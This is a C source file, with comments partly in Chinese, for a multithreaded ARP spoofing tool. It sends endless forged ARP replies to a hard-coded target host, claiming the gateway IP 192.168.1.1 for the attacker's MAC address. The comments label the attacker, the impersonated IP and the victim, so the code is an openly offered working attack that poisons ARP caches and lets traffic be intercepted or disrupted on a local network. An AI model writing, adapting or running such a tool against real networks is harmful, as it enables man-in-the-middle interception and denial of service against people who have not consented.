#include "arp.h"
#include <pthread.h>


//攻擊者的MAC
unsigned char MAC_SOURCE[6]={0x18,0xd6,0xc7,0x44,0x55,0x66};
#define IP_TRICK "192.168.1.1"//冒充的IP
//目標的MAC
unsigned char MAC_TARGET[6]={0xbc,0xee,0x7b,0xda,0x4f,0x06}; 
#define IP_TARGET "192.168.1.100"//要攻擊的IP

void *start_spoof(void *arg);

int main(int argc, char **argv)
{
    int i = 0;
    pthread_t *flood_t = (pthread_t*)malloc(sizeof(pthread_t) * atoi(argv[1]));

    for(i = 0; i < atoi(argv[1]); i++)
    {
        // create flood thread
        pthread_create(&flood_t[i], NULL, start_spoof, atoi(argv[1]));
        pthread_detach(flood_t[i]);
    }
    printf("spawned %d threads\n", i);

    // last message before pwn...
    printf("press Enter to stop flooding...\n");
    fflush(stdout);

    // wait for enter hit
    while (getchar() != 0xA);

    for(i = 0; i < atoi(argv[1]); i++)
    {
        // end thread
        pthread_cancel(flood_t[i]);
    }
    printf("killed %d threads\n", i);
    free(flood_t);

    // we close the socket
    printf("program terminated successfully\n");
    return (EXIT_SUCCESS);
}
	
void *start_spoof(void *arg)
{
	int sfd,len,sent = 0;
	struct arp_packet arp;
	struct in_addr inaddr_sender,inaddr_receiver;
	struct sockaddr_ll sl;

	/*AF_PACKET指(Low level packet interface)*/
	/*ETH_P_ALL可替換為ETH_P_IP或其他定義在<if_ether.h>中的protocol flag*/
	sfd=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_ALL));
	if(-1==sfd)
	{
		perror("socket");
	}
	//clear the struct arp
	memset(&arp,0,sizeof(arp));
	
	//copy MAC_TARGET to arp.mac_target
	memcpy(arp.mac_target,MAC_TARGET,sizeof(MAC_TARGET));
	//copy MAC_SOURCE to arp.mac_source
	memcpy(arp.mac_source,MAC_SOURCE,sizeof(MAC_SOURCE));

	
	//put the vaiable to struct "ARP_packet" that name 'arp'

	arp.ethertype=htons(ETH_P_ARP); //ETH_P_ARP=0x0806,means address resolution packet
	arp.hw_type=htons(0x1); //unsigned short hw_type; 
        arp.proto_type=htons(ETH_P_IP); //proto_ip通訊協定協議(0x0000)

	//mac長度
	arp.mac_addr_len=ETH_ALEN;
	//ip長度
	arp.ip_addr_len=4;
	//0x1代表ARP請求包,0x2表示應答包
	arp.operation_code=htons(0x2);
	

	memcpy(arp.mac_sender,&MAC_SOURCE,sizeof(MAC_SOURCE));
	inet_aton(IP_TRICK,&inaddr_sender);
	memcpy(&arp.ip_sender,&inaddr_sender,sizeof(inaddr_sender));
	

	memcpy(arp.mac_receiver,MAC_TARGET,sizeof(MAC_TARGET));
	inet_aton(IP_TARGET,&inaddr_receiver);	
	memcpy(&arp.ip_receiver,&inaddr_receiver,sizeof(inaddr_receiver));
	
	memset(&sl,0,sizeof(sl));
	sl.sll_family=AF_PACKET;
	sl.sll_ifindex=IFF_BROADCAST;
		
	while(1){
		//將資料由指定的socket傳給對方主機
		len=sendto(sfd,&arp,sizeof(arp),0,(struct sockaddr*)&sl,sizeof(sl));
		if(len < 0){
			perror("sendto");
		}
		else{
			++sent;
			printf("%d packets sent\r", sent);
			fflush(stdout);
			usleep(1);
		}
	}	
}	
